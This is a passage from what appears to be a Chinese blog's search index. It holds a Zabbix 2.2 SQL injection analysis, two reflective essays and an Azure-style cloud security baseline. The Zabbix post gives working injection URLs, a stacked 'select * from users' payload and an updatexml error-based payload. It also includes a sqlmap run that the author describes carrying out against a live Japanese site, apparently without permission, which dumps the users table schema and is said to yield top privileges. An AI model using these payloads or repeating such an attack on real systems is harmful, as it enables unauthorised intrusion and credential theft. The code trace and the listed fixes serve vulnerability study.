17&amp;itemids%5B23297%5D=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp; mark_color=1\n如果出现下列代码则证明漏洞存在\n&lt;div class=&quot;flickerfreescreen&quot; data-timestamp=&quot;1471054088083&quot; id=&quot;flickerfreescreen_1&quot;&gt;&lt;table class=&quot;list-table&quot; id=&quot;t57ae81946b8cb&quot;&gt;&lt;thead&gt;&lt;tr&gt;&lt;th class=&quot;cell- width&quot;&gt;Timestamp&lt;/th&gt;&lt;th&gt;Value&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr class=&quot;nothing-to-show&quot;&gt;&lt;td colspan=&quot;2&quot;&gt;No data found.&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class=&quot;msg-bad&quot;&gt;&lt;div class=&quot;msg-details&quot;&gt;&lt;ul&gt;&lt;li&gt;Error in query [INSERT INTO profiles (profileid, userid, idx, value_int, type, idx2) VALUES (39, 1, &#39;web.item.graph.period&#39;, &#39;3600&#39;, 2, 2&#39;3297)] [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;3297)&#39; at line 1]&lt;/li&gt;&lt;li&gt;Error in query [INSERT INTO profiles (profileid, userid, idx, value_str, type, idx2) VALUES (40, 1, &#39;web.item.graph.stime&#39;, &#39;20160813041028&#39;, 3, 2&#39;3297)] [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;3297)&#39; at line 1]&lt;/li&gt;&lt;li&gt;Error in query [INSERT INTO profiles (profileid, userid, idx, value_int, type, idx2) VALUES (41, 1, &#39;web.item.graph.isnow&#39;, &#39;1&#39;, 2, 2&#39;3297)] [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;3297)&#39; at line 1]&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;&lt;span class=&quot;overlay-close-btn&quot; onclick=&quot;javascript: $(this).closest(&#39;.msg-bad&#39;).remove();&quot; title=&quot;Close&quot;&gt;&lt;/span&gt;&lt;/div&gt;\n\n利用方式二\n\nlatest.php?output=ajax&amp;sid=&amp;favobj=toggle&amp;toggle_open_state=1&amp;toggle_ids[]=15385);select * from users where (1=1\n如果出现下列代码则证明漏洞存在\nSQL (0.000361):INSERT INTO profiles (profileid, userid, idx, value_int, type, idx2) VALUES(88, 1, &#39;web.latest.toggle&#39;, &#39;1&#39;, 2, 15385); select * from users where (1=1) latest.php:746 →require_once() → CProfile::flush() → CProfile::insertDB() → DBexecute() in/home/sasha/zabbix-svn/branches/2.2/frontends/php/include/profiles.inc.php:185\n0x04 实战测试测试的一个Japan站\nsqlmap -u &quot;http://157.×××.×××.98/jsrpc.php?type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=1+or+updatexml(1(select(select+concat(0x7e,alias,0x7e,passwd,0x7e))+from+zabbix.users+LIMIT+0,1),1)+or+1=1)%23&amp;updateProfile=true&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&quot; --level=3 --risk=2 --columns -T &quot;users&quot; -D &quot;public&quot;\nDatabase: publicTable: users[16 columns]+----------------+---------+| Column         | Type    |+----------------+---------+| alias          | varchar || attempt_clock  | int4    || attempt_failed | int4    || attempt_ip     | varchar || autologin      | int4    || autologout     | int4    || lang           | varchar || name           | varchar || passwd         | bpchar  || refresh        | int4    || rows_per_page  | int4    || surname        | varchar || theme          | varchar || type           | int4    || url            | varchar || userid         | int8    |+----------------+---------+\n\n可获得最高权限\n0x05 代码分析zabbix 2.2.14\n\n首先从poc中的jsrpc.php文件入手，\n\nrequire_once dirname(__FILE__).&#x27;/include/config.inc.php&#x27;;$requestType = get_request(&#x27;type&#x27;, PAGE_TYPE_JSON);if ($requestType == PAGE_TYPE_JSON) &#123;    $http_request = new CHTTP_request();    $json = new CJSON();    $data = $json-&gt;decode($http_request-&gt;body(), true);&#125;else &#123;    $data = $_REQUEST;&#125;\n\n从这里看到data是由REQUEST赋值的，接受 GET/POST/COOKIE任意一种输入，所以payload可以用get方式传输，在payload中由method=screen.get这一部分，在源码中可以看到如下代码\ncase &#x27;screen.get&#x27;:        $options = array(            &#x27;pageFile&#x27; =&gt; !empty($data[&#x27;pageFile&#x27;]) ? $data[&#x27;pageFile&#x27;] : null,            &#x27;mode&#x27; =&gt; !empty($data[&#x27;mode&#x27;]) ? $data[&#x27;mode&#x27;] : null,            &#x27;timestamp&#x27; =&gt; !empty($data[&#x27;timestamp&#x27;]) ? $data[&#x27;timestamp&#x27;] : time(),            &#x27;resourcetype&#x27; =&gt; !empty($data[&#x27;resourcetype&#x27;]) ? $data[&#x27;resourcetype&#x27;] : null,            &#x27;screenitemid&#x27; =&gt; !empty($data[&#x27;screenitemid&#x27;]) ? $data[&#x27;screenitemid&#x27;] : null,            &#x27;groupid&#x27; =&gt; !empty($data[&#x27;groupid&#x27;]) ? $data[&#x27;groupid&#x27;] : null,            &#x27;hostid&#x27; =&gt; !empty($data[&#x27;hostid&#x27;]) ? $data[&#x27;hostid&#x27;] : null,            &#x27;period&#x27; =&gt; !empty($data[&#x27;period&#x27;]) ? $data[&#x27;period&#x27;] : null,            &#x27;stime&#x27; =&gt; !empty($data[&#x27;stime&#x27;]) ? $data[&#x27;stime&#x27;] : null,            &#x27;profileIdx&#x27; =&gt; !empty($data[&#x27;profileIdx&#x27;]) ? $data[&#x27;profileIdx&#x27;] : null,            &#x27;profileIdx2&#x27; =&gt; !empty($data[&#x27;profileIdx2&#x27;]) ? $data[&#x27;profileIdx2&#x27;] : null,            &#x27;updateProfile&#x27; =&gt; isset($data[&#x27;updateProfile&#x27;]) ? $data[&#x27;updateProfile&#x27;] : null        );        if ($options[&#x27;resourcetype&#x27;] == SCREEN_RESOURCE_HISTORY) &#123;            $options[&#x27;itemids&#x27;] = !empty($data[&#x27;itemids&#x27;]) ? $data[&#x27;itemids&#x27;] : null;            $options[&#x27;action&#x27;] = !empty($data[&#x27;action&#x27;]) ? $data[&#x27;action&#x27;] : null;            $options[&#x27;filter&#x27;] = !empty($data[&#x27;filter&#x27;]) ? $data[&#x27;filter&#x27;] : null;            $options[&#x27;filter_task&#x27;] = !empty($data[&#x27;filter_task&#x27;]) ? $data[&#x27;filter_task&#x27;] : null;            $options[&#x27;mark_color&#x27;] = !empty($data[&#x27;mark_color&#x27;]) ? $data[&#x27;mark_color&#x27;] : null;        &#125;        elseif ($options[&#x27;resourcetype&#x27;] == SCREEN_RESOURCE_CHART) &#123;            $options[&#x27;graphid&#x27;] = !empty($data[&#x27;graphid&#x27;]) ? $data[&#x27;graphid&#x27;] : null;            $options[&#x27;profileIdx2&#x27;] = $options[&#x27;graphid&#x27;];        &#125;        $screenBase = CScreenBuilder::getScreen($options);        if (!empty($screenBase)) &#123;            $screen = $screenBase-&gt;get();        &#125;        if (!empty($screen)) &#123;            if ($options[&#x27;mode&#x27;] == SCREEN_MODE_JS) &#123;                $result = $screen;            &#125;            else &#123;                if (is_object($screen)) &#123;                    $result = $screen-&gt;toString();                &#125;            &#125;        &#125;        else &#123;            $result = &#x27;&#x27;;        &#125;        break;省略部分代码require_once dirname(__FILE__).&#x27;/include/page_footer.php&#x27;;\n\n其中$options[profileIdx2]赋值了$data[profileIdx2]，之后调用这几句代码\n$screenBase = CScreenBuilder::getScreen($options);if (!empty($screenBase)) &#123;    $screen = $screenBase-&gt;get();&#125;\n\n一时没了思路，跟几句代码死磕，找到zabbix-2.2.14/frontends/php/include/classes/screens/CScreenBuilder.php，在public static function getScreen(array $options = array())函数中没有找到可以造成漏洞的交互点，太菜了！！！ ,可以看到profileIdx2已经到达了下面代码中了\n// calculate time        $this-&gt;profileIdx = !empty($options[&#x27;profileIdx&#x27;]) ? $options[&#x27;profileIdx&#x27;] : &#x27;&#x27;;        $this-&gt;profileIdx2 = !empty($options[&#x27;profileIdx2&#x27;]) ? $options[&#x27;profileIdx2&#x27;] : null;        $this-&gt;updateProfile = isset($options[&#x27;updateProfile&#x27;]) ? $options[&#x27;updateProfile&#x27;] : true;\n\n一路上没有经过任何过滤，然后接着往下看可以看到\n$this-&gt;timeline = CScreenBase::calculateTime(array(            &#x27;profileIdx&#x27; =&gt; $this-&gt;profileIdx,            &#x27;profileIdx2&#x27; =&gt; $this-&gt;profileIdx2,            &#x27;updateProfile&#x27; =&gt; $this-&gt;updateProfile,            &#x27;period&#x27; =&gt; !empty($options[&#x27;period&#x27;]) ? $options[&#x27;period&#x27;] : null,            &#x27;stime&#x27; =&gt; !empty($options[&#x27;stime&#x27;]) ? $options[&#x27;stime&#x27;] : null        ));\n\nprofileIdx2成为了calculateTime的参数，这时我们追踪一下calculateTime函数，在zabbix-2.2.14/frontends/php/include/classes/screens/CScreenBase.php中，代码如下\npublic static function calculateTime(array $options = array()) &#123;    if (!array_key_exists(&#x27;updateProfile&#x27;, $options)) &#123;        $options[&#x27;updateProfile&#x27;] = true;    &#125;    if (empty($options[&#x27;profileIdx2&#x27;])) &#123;        $options[&#x27;profileIdx2&#x27;] = 0;    &#125;    // show only latest data without update is set only period    if (!empty($options[&#x27;period&#x27;]) &amp;&amp; empty($options[&#x27;stime&#x27;])) &#123;        $options[&#x27;updateProfile&#x27;] = false;        $options[&#x27;profileIdx&#x27;] = &#x27;&#x27;;    &#125;    // period    if (empty($options[&#x27;period&#x27;])) &#123;        $options[&#x27;period&#x27;] = !empty($options[&#x27;profileIdx&#x27;])            ? CProfile::get($options[&#x27;profileIdx&#x27;].&#x27;.period&#x27;, ZBX_PERIOD_DEFAULT, $options[&#x27;profileIdx2&#x27;])            : ZBX_PERIOD_DEFAULT;    &#125;    else &#123;        if ($options[&#x27;period&#x27;] &lt; ZBX_MIN_PERIOD) &#123;            show_message(_n(&#x27;Minimum time period to display is %1$s hour.&#x27;,                    &#x27;Minimum time period to display is %1$s hours.&#x27;, (int) ZBX_MIN_PERIOD / SEC_PER_HOUR));            $options[&#x27;period&#x27;] = ZBX_MIN_PERIOD;        &#125;        elseif ($options[&#x27;period&#x27;] &gt; ZBX_MAX_PERIOD) &#123;            show_message(_n(&#x27;Maximum time period to display is %1$s day.&#x27;,                    &#x27;Maximum time period to display is %1$s days.&#x27;, (int) ZBX_MAX_PERIOD / SEC_PER_DAY));            $options[&#x27;period&#x27;] = ZBX_MAX_PERIOD;        &#125;    &#125;    if ($options[&#x27;updateProfile&#x27;] &amp;&amp; !empty($options[&#x27;profileIdx&#x27;])) &#123;        CProfile::update($options[&#x27;profileIdx&#x27;].&#x27;.period&#x27;, $options[&#x27;period&#x27;], PROFILE_TYPE_INT, $options[&#x27;profileIdx2&#x27;]);    &#125;\n\n重点来了，可以看到CProfile::update($options[&#39;profileIdx&#39;].&#39;.period&#39;, $options[&#39;period&#39;], PROFILE_TYPE_INT, $options[&#39;profileIdx2&#39;]);这句，这时接着追踪CProfile来到page_footer.php中找到profiles.inc.php，\npublic static function update($idx, $value, $type, $idx2 = 0) &#123;        if (is_null(self::$profiles)) &#123;            self::init();        &#125;        if (!self::checkValueType($value, $type)) &#123;            return false;        &#125;        $profile = array(            &#x27;idx&#x27; =&gt; $idx,            &#x27;value&#x27; =&gt; $value,            &#x27;type&#x27; =&gt; $type,            &#x27;idx2&#x27; =&gt; $idx2        );        $current = CProfile::get($idx, null, $idx2);        if (is_null($current)) &#123;            if (!isset(self::$insert[$idx])) &#123;                self::$insert[$idx] = array();            &#125;            self::$insert[$idx][$idx2] = $profile;        &#125;\n\n可以看到self::$insert[$idx][$idx2] = $profile;，参数已经到了insert中，\n然后去请教表哥，表哥提示问题出现在flush中根据表哥的提示，在page_footer.php中发现CProfile类的flush方法\n// last pageif (!defined(&#x27;ZBX_PAGE_NO_MENU&#x27;) &amp;&amp; $page[&#x27;file&#x27;] != &#x27;profile.php&#x27;) &#123;    CProfile::update(&#x27;web.paging.lastpage&#x27;, $page[&#x27;file&#x27;], PROFILE_TYPE_STR);&#125;CProfile::flush();// end transactions if they have not been closed alreadyif (isset($DB) &amp;&amp; isset($DB[&#x27;TRANSACTIONS&#x27;]) &amp;&amp; $DB[&#x27;TRANSACTIONS&#x27;] != 0) &#123;    error(_(&#x27;Transaction has not been closed. Aborting...&#x27;));    DBend(false);&#125;\n\n在profiles.inc.php中找到了flush函数\npublic static function flush() &#123;        // if not initialised, no changes were made        if (is_null(self::$profiles)) &#123;            return true;        &#125;        if (self::$userDetails[&#x27;userid&#x27;] &lt;= 0) &#123;            return null;        &#125;        if (!empty(self::$insert) || !empty(self::$update)) &#123;            DBstart();            foreach (self::$insert as $idx =&gt; $profile) &#123;                foreach ($profile as $idx2 =&gt; $data) &#123;                    self::insertDB($idx, $data[&#x27;value&#x27;], $data[&#x27;type&#x27;], $idx2);                &#125;            &#125;            ksort(self::$update);            foreach (self::$update as $idx =&gt; $profile) &#123;                ksort($profile);                foreach ($profile as $idx2 =&gt; $data) &#123;                    self::updateDB($idx, $data[&#x27;value&#x27;], $data[&#x27;type&#x27;], $idx2);                &#125;            &#125;            DBend();        &#125;    &#125;\n\n参数传入下面的insertDB函数\nprivate static function insertDB($idx, $value, $type, $idx2) &#123;        $value_type = self::getFieldByType($type);        $values = array(            &#x27;profileid&#x27; =&gt; get_dbid(&#x27;profiles&#x27;, &#x27;profileid&#x27;),            &#x27;userid&#x27; =&gt; self::$userDetails[&#x27;userid&#x27;],            &#x27;idx&#x27; =&gt; zbx_dbstr($idx),            $value_type =&gt; zbx_dbstr($value),            &#x27;type&#x27; =&gt; $type,            &#x27;idx2&#x27; =&gt; $idx2        );        return DBexecute(&#x27;INSERT INTO profiles (&#x27;.implode(&#x27;, &#x27;, array_keys($values)).&#x27;) VALUES (&#x27;.implode(&#x27;, &#x27;, $values).&#x27;)&#x27;);    &#125;\n\n可以看到第四个参数没有过滤，通过DBexecute被带到了数据库中\nfunction DBexecute($query, $skip_error_messages = 0) &#123;    global $DB;    if (!isset($DB[&#x27;DB&#x27;]) || empty($DB[&#x27;DB&#x27;])) &#123;        return false;    &#125;    $result = false;    $time_start = microtime(true);    $DB[&#x27;EXECUTE_COUNT&#x27;]++;    switch ($DB[&#x27;TYPE&#x27;]) &#123;        case ZBX_DB_MYSQL:            if (!$result = mysqli_query($DB[&#x27;DB&#x27;], $query)) &#123;                error(&#x27;Error in query [&#x27;.$query.&#x27;] [&#x27;.mysqli_error($DB[&#x27;DB&#x27;]).&#x27;]&#x27;);            &#125;            break;\n\n0x06 漏洞修复\n版本升级\n打补丁\n关闭guest\n\n0x07 后记这里还有好多东西没有搞懂，毕竟太菜\n","categories":["漏洞分析"],"tags":["PHP"]},{"title":"不知命，无以为君子也","url":"/%E4%B8%8D%E7%9F%A5%E5%91%BD%EF%BC%8C%E6%97%A0%E4%BB%A5%E4%B8%BA%E5%90%9B%E5%AD%90%E4%B9%9F/","content":"标题取自《论语》孔子曰：“不知命，无以为君子也；不知礼，无以立也；不知言，无以知人也。”\n何谓“命”？\n《中庸》开篇的第一句话就是：“天命之谓性，率性之谓道”。\n《庄子》“死生存亡，穷达贫富，贤与不肖毁誉，饥渴寒暑，是事之变，命之行也。”\n老子曰：“人法地，地法天，天法道，道法自然。”\n在佛教中也有类似言论“随缘不是得过且过，因循苟且，而是尽人事听天命。”\n儒释道都反复提到了“命”，何为命？这个题目本不敢来写，但是有了些许顿悟，三十而立，四十而不惑，五十而知天命，年少无知，窥得一丝清明，实在是想分享给同在困顿中的人\n在很久之前，就听过这句话\n“一命二运三风水四积阴德五读书六名七相八敬神九交贵人十养生”\n年轻的时候，心比天高，相信的是人定胜天、逆天改命\n临近而立，才发现生死存亡、富贵穷通，皆不是单凭一腔热血可以改变的，一度陷入迷惘\n偶然在B站看到王德峰的《命运与修行》分享，突然间将很多思绪、困惑、事情都串起来了，心中闪电闪过的感觉，隐约抓到一点\n命，是在娘胎中就已注定的了，是天生富贵还是贫贱、是健康还是疾病缠身、以及后来的性格、配偶、子女等，都是人生命运，你以为你做出了选择，其实早已在命中注定\n但是，我想表达的绝不是一种消极的思想，而是知天命，才能追求到真正的快乐\n问下我们自己，现在努力的工作、做梦也想暴富，是为了什么？是不是还是为了追求快乐？\n那什么才是真正的快乐？\n子曰：“贤哉回也，一箪食，一瓢饮，在陋巷，人不堪其忧，回也不改其乐。”\n为什么在这么糟糕的环境下，颜回还是能享受快乐？或许答案就在“天命”\n君子素其位而行，不愿乎其外。素富贵，行乎富贵；素贫贱，行乎贫贱；素夷狄，行乎夷狄；素患难，行乎患难。君子无入而不自得焉。\n天生富贵，便做富贵人该做的事，天生贫贱，那就做个穷人努力让自己小康，妄求则生贪念，天生贫贱却妄想大富大贵，这便是“逆天命”，带来的只有无尽的焦虑，君子为人处事，无论处于什么样的境遇，怡然自得，才是真快乐\n但是这并不是说天生贫贱就会一直贫贱，而是说在贫贱的位置做贫贱的事，可以通过个人努力奔赴小康，但是大富大贵就需要天降机遇，这也是天命，核心的思想是“活在当下，但行好事”\n而我们总是在不经意间将命运的赠予当成自己努力的结果\n无论我们处于什么样的境遇，我们真正应该追求的是快乐，人生起起伏伏，皆是命里注定，所以要知天命，不去妄求，顺应天道，在属于自己的位子去积极的追求快乐，剩下的一切都交给“天命”，如果一味想着逆天改命，大概率也是忙忙碌碌郁结一生\n韩裔德国哲学家韩炳哲认为，社会进入“新自由主义”后，人们看似自由，人人以为自己自由了，但实际上进入了充满竞争的“绩效社会”，人们都是在心甘情愿地自己剥削自己，从黑格尔主奴辨证法来理解，每个人既是自己的主人也是自我压榨的奴隶，由此，人们进入了 “倦怠社会”\n现在的“躺平氛围”我反倒觉得是社会真正的进步，至少大家知道自己不想要什么了，知道一味追求金钱并不会让自己真正快乐\n既然知道自己不想要什么了，那离知道自己想要什么还远吗？\n言语道断，一说就错，这种心中的明悟很难用语言来表达，但是核心观点总结一下，无论出身境遇如何，皆是天命，是不可改变的，但是要知道我们匆匆来世上一遭，真正想要追求的是什么，归根结底是快乐、是心灵的平静，所以当认命后，才有机会断掉那些妄求，去把握住当下，剩下的一切继续交与命运，无论将来是富贵还是通达\n","categories":["胡思乱想"],"tags":["THINK"]},{"title":"为什么我们会对新事物产生抵触心理","url":"/%E4%B8%BA%E4%BB%80%E4%B9%88%E6%88%91%E4%BB%AC%E4%BC%9A%E5%AF%B9%E6%96%B0%E4%BA%8B%E7%89%A9%E4%BA%A7%E7%94%9F%E6%8A%B5%E8%A7%A6%E5%BF%83%E7%90%86/","content":"当我们做出选择改变时，不知道将会得到什么，但很清楚将会失去什么。\n\n回想一下，是不是或多或少会有一些类似的场景，当出现一个新的偶像明星时，特别是帅的或漂亮的，会迅速的下一个判断，觉得没有真才实学全靠包装，觉得他们的粉丝都是脑残；在玩LOL或王者时，被对面强势英雄干的很惨，是不是每次先把自己觉得打不过的ban掉，却很少去主动练习这类强势英雄；当一项新技术、新设计、新政策出现时，网上和我们身边，往往会充斥着吐槽、抵制的声音，往往要很长一段时间才会变成真香，例如当年汽车诞生时的《红旗法案》。\n上述的这类例子数不胜数，笔者有时候会觉得自己是不是没有跟上这个时代的节奏。所以将这种下意识的心理活动拿出来分析下，一家之言，不必当真。\n认识的一位博学大佬，在分析人的行为时，经常会用进化论来分析，学到很多。细想了下，这种抵触心理一样可以用进化论来解释，在人类茹毛饮血的时代，危机四伏，尝试新事物往往意味着未知的风险，而不去尝试则风险会小很多，所以对未知的恐惧就写入了我们的基因里，一直到今天。\n从人的内心来看，接受新的事物，本质是和旧的自己对抗，而与自己做斗争往往是最难的。这个旧的自己，我把它理解为成见，在《哪吒之魔童降世》里有句话感触很深：“人心中的成见是一座大山，任你怎么努力都休想搬动。”\n但从笔者自身来看，却不是对所有的新事物都会产生抵触心理，在那些自己比较熟悉的领域，往往会有相反的状态，努力去学习最前沿的技术，希望出现使生产力更高的事物。这么看来，我们对新事物的抵触往往是出现在那些陌生或者简单了解的领域，而在这些领域，经常会出现轻视的情况，对自己简单了解的事情轻易的做出判断，在韩寒的《我也曾对那种力量一无所知》一文中详尽道出。\n在想明白了这些后，也就理解了为什么还有那么多人在吐槽“拥抱变化”这条价值观，拥抱变化说到底也是让我们去积极拥抱新事物。因为当我们做出选择改变时，不知道将会得到什么，但很清楚将会失去什么。\n古有“昔有学步于邯郸者，曾未得其仿佛，又复失其故步，遂匍匐而归耳。” 近有“穷则变，变则通”。有个寓言故事《谁动了我的奶酪？》，说的也是这个道理。\n在这段时间里，笔者尝试着去改变，在面对新事物的时候，下意识的告诉自己去试一试，说不定是新的世界。当抖音、头条兴起的时候，在简单的使用过后，武断的下了“没有营养的APP”的结论，但是就是这样的业务，火遍全球，成为国内互联网公司出海比较成功的一个，背后的价值需要去深入思考（当然笔者现在还是觉得比较浪费时间），但是短视频、vlog等新的信息载体要尝试主动去拥抱。还有AI、5G等等，Elon Musk的风格是值得学习的。\n生活中也有一些尝试，听歌的时候也会点开“今日流行”歌单盲听；在股市、币市里投了一点钱尝试去感受这个领域的变化；也有尝试着去融入00后的圈子，感受时代的变化，等等。\n~~注：本文是笔者睡前随笔，不带有任何观点\n","categories":["胡思乱想"],"tags":["THINK"]},{"title":"云安全基线","url":"/%E4%BA%91%E5%AE%89%E5%85%A8%E5%9F%BA%E7%BA%BF/","content":"网络安全网络安全包含用于保护 Azure 网络的控制措施，包括保护虚拟网络、建立专用连接、阻止和减少外部攻击以及保护 DNS。\nNS-1：建立网络分段边界安全原则：确保虚拟网络部署符合 GS-2 安全控制中定义的企业分段策略。 任何可能给组织带来较高风险的工作负载都应位于独立的虚拟网络中。 高风险工作负载的示例包括：\n\n    存储或处理高度敏感数据的应用程序。\n\n\n    公众或组织外部用户可访问的面向外部网络的应用程序。\n\n\n    使用不安全的体系结构或包含无法轻松修正的漏洞的应用程序。\n\n\n\n若要增强企业的分段策略，请通过网络控制限制或监视内部资源之间的流量。 对于明确定义的特定应用程序（例如 3 层应用），可采用高度安全的“默认拒绝，允许例外”方法，包括限制网络流量的端口、协议、源和目标 IP。 如果有多个应用程序和终结点彼此交互，那么阻止流量的扩展性可能并不好，你可能只能监视流量。\nNS-2：使用网络控制保护云服务安全原则：通过为资源建立专用访问点保护云服务。 如果可能，还应禁用或限制来自公共网络的访问。\nNS-3：在企业网络边缘部署防火墙安全原则：部署防火墙，对与外部网络之间的网络流量执行高级筛选。 还可以在内部段之间使用防火墙来支持分段策略。 如果需要，在需要强制网络流量通过网络设备以进行安全控制时，请使用子网的自定义路由来替代系统路由。至少要阻止已知的不良 IP 地址和高风险协议，例如远程管理（例如 RDP 和 SSH）和 Intranet 协议（例如 SMB 和 Kerberos）。\nNS-4：部署入侵检测/入侵防护系统 (IDS/IPS)安全原则：使用网络入侵检测和入侵防护系统 (IDS/IPS) 检查进出工作负载的网络和有效负载流量。 请确保始终优化 IDS/IPS，为 SIEM 解决方案提供高质量的警报。有关更深入的主机级别检测和防护功能，请将基于主机的 IDS/IPS 或基于主机的终结点检测和响应 (EDR) 解决方案与网络 ID/IPS 结合使用。\nNS-5：部署 DDOS 防护安全原则：部署分布式拒绝服务 (DDoS) 防护，以保护网络和应用程序免受攻击。\nNS-6：部署 Web 应用程序防火墙安全原则：部署 Web 应用程序防火墙 (WAF) 并配置适当的规则，以保护 Web 应用程序和 API 免受特定于应用程序的攻击。\nNS-7：简化网络安全配置安全原则：管理复杂的网络环境时，请使用工具来简化、集中和增强网络安全管理。\nNS-8：检测并禁用不安全的服务和协议安全原则：在操作系统、应用程序或软件包层检测并禁用不安全的服务和协议。 如果无法禁用不安全的服务和协议，请部署补偿控制。\nNS-9：以私密方式连接本地或云网络安全原则：使用专用连接在不同网络之间进行安全通信，例如在归置环境中的云服务提供商数据中心和本地基础结构之间。\nNS-10：确保域名系统 (DNS) 安全性安全原则：确保域名系统 (DNS) 安全配置能够防范已知风险：\n\n    在云环境中使用受信任的权威和递归 DNS 服务，以确保客户端（例如操作系统和应用程序）收到正确的解析结果。\n\n\n    将公共和专用 DNS 解析分开，以便可以将专用网络的 DNS 解析过程与公共网络的 DNS 解析过程隔离开来。\n\n\n    确保 DNS 安全策略还包括针对常见攻击的缓解措施，例如无关联 DNS、DNS 放大攻击、DNS 中毒和欺骗等。\n\n\n\n身份管理标识管理包括用于使用 Azure Active Directory 建立安全标识和访问控制的控制措施，其中包括使用单一登录、强身份验证、用于应用程序的托管标识（和服务主体）、条件访问和帐户异常监视。\nIM-1：使用集中式标识和身份验证系统安全原则：使用集中式标识和身份验证系统来管理组织的标识以及云和非云资源的身份验证。\nIM-2：保护标识和身份验证系统安全原则：在组织的云安全实践中，将标识和身份验证系统的保护视为具有高优先级的实践。 常见的安全控制措施包括：\n\n    限制特权角色和帐户\n\n\n    要求对所有特权访问进行强身份验证\n\n\n    监视和审核高风险活动\n\n\n\nIM-3：安全且自动地管理应用程序标识安全原则：使用托管应用程序标识，而不是为应用程序创建用于访问资源和执行代码的人工帐户。 托管应用程序标识提供了一些好处，例如减少凭据的暴露。 自动轮换凭据以确保标识的安全性。\nIM-4：对服务器和服务进行身份验证安全原则：从客户端对远程服务器和服务进行身份验证，以确保连接到受信任的服务器和服务。 最常见的服务器身份验证协议是传输层安全性 (TLS)，其中客户端（通常是浏览器或客户端设备）通过验证服务器的证书是否由受信任的证书颁发机构颁发来验证服务器。注意：当服务器和客户端相互进行身份验证时，可以使用相互身份验证。\nIM-5：使用单一登录(SSO)进行应用程序访问安全原则：使用单一登录 (SSO) 简化跨云服务和本地环境对资源（包括应用程序和数据）进行身份验证的用户体验。\nIM-6：使用强身份验证控制安全原则：对所有资源访问使用集中式标识和身份验证管理系统强制实施强身份验证控制（强的无密码身份验证或多重身份验证）。 仅基于密码凭据的身份验证被视为旧版身份验证，因为它不安全且无法抵御常见的攻击方法。部署强身份验证时，请先配置管理员和特权用户，以确保使用最高级别的强身份验证方法，紧接着向所有用户推出适当的强身份验证策略。注意：如果旧版应用程序和方案需要基于旧版密码的身份验证，请确保遵循密码安全最佳做法，例如复杂性要求。\nIM-7：根据条件限制资源访问安全原则：在零信任访问模型中，显式验证受信任的信号以允许或拒绝用户访问资源。 要验证的信号应包括用户帐户的强身份验证、用户帐户的行为分析、设备可信度、用户或组成员身份、位置等。\nIM-8：限制凭据和机密的泄露安全原则：确保应用程序开发人员安全地处理凭据和机密：\n\n    避免将凭据和机密嵌入到代码和配置文件中\n\n\n    使用密钥保管库或安全密钥存储服务来存储凭据和机密\n\n\n    扫描源代码中的凭据。\n\n\n\n注意：这通常通过安全的软件开发生命周期 (SDLC) 和 DevOps 安全流程进行管理和实施。\nIM-9：保护用户对现有应用程序的访问安全原则：在混合环境中，如果其中有使用旧式身份验证的本地应用程序或非本机云应用程序，请考虑云访问安全代理 (CASB)、应用程序代理、单一登录 (SSO) 等解决方案来管理对这些应用程序的访问，以获得以下好处：\n\n    强制执行集中式强身份验证\n\n\n    监视和控制风险最终用户活动\n\n\n    监视和修正有风险的旧版应用程序活动\n\n\n    检测和防止敏感数据传输\n\n\n\n特权访问特权访问包括用于保护对你的 Azure 租户和资源的特权访问的控制措施，包括一系列用于避免管理模型、管理帐户和特权访问工作站面临有意和无意的风险的控制措施。\nPA-1：隔离和限制高度特权/管理用户安全原则：确保你将标识所有严重影响业务的帐户。 限制云的控制平面、管理平面和数据/工作负载平面中的特权/管理帐户的数量。\nPA-2：避免对用户帐户和权限的长期访问安全原则：使用实时 (JIT) 机制将特权访问分配到不同的资源层，而不是创建已有的权限。\nPA-3：管理标识和权利的生命周期安全原则：使用自动化流程或技术控制来管理标识和访问生命周期，包括请求、审查、批准、预配和取消预配。\nPA-4：定期审查和协调用户访问权限安全原则：定期审查特权帐户权利。 确保授予帐户的访问权限对控制平面、管理平面和工作负载的管理有效。\nPA-5：设置紧急访问安全原则：设置紧急访问，确保不会在紧急情况下意外锁定关键云基础结构（例如标识和访问管理系统）。紧急访问帐户应很少使用，如果泄露，会对组织造成巨大损害，但在极少数需要紧急访问帐户的情况下，紧急访问帐户对于组织的可用性又是至关重要的。\nPA-6：使用特权访问工作站安全原则：受保护的独立工作站对于机密角色（如管理员、开发人员和关键服务操作员）的安全性至关重要。\nPA-7：遵循 Just Enough Administration（最小特权）原则安全原则：遵循 Just Enough Administration（最小特权）原则以在精细的级别管理权限。 使用基于角色的访问控制 (RBAC) 等功能，通过角色分配管理资源访问。\nPA-8 确定云提供商支持的访问流程安全原则：建立用于请求和批准供应商支持请求的审批流程和访问路径，并通过安全通道临时访问数据。\n数据保护数据保护涵盖控制静态数据保护、传输中的数据保护以及通过授权访问机制实现的数据保护，包括使用 Azure 中的访问控制、加密、密钥和证书管理发现、分类、保护和监视敏感数据资产。\nDP-1：对敏感数据进行发现、分类和标记安全原则：根据定义的敏感数据范围，建立和维护敏感数据的清单。 使用工具发现、分类和标记范围内的敏感数据。\nDP-2：监视针对敏感数据的异常情况和威胁安全原则：监控敏感数据周围的异常情况，例如未经授权将数据传输到企业可见性和控制范围之外的位置。 这通常涉及监视那些可能意味着未经授权的数据外泄的异常活动（大型或异常传输）。\nDP-3：加密传输中的敏感数据安全原则：使用加密保护传输中的数据免受“带外”攻击（例如流量捕获），确保攻击者无法轻松读取或修改数据。设置网络边界和服务范围，并在网络内部和外部强制实施传输中数据加密。 虽然这对于专用网络上的流量来说是可选的，但对于外部和公共网络上的流量来说，这是至关重要的。\nDP-4：默认启用静态数据加密安全原则：为了对访问控制进行补充，应使用加密保护静态数据，以免遭受“带外”攻击（例如访问底层存储）。 这有助于确保攻击者无法轻松读取或修改数据。\nDP-5：需要时在静态数据加密中使用客户管理的密钥选项安全原则：根据法规合规性要求，如果需要，请定义需要客户管理的密钥选项的用例和服务范围。 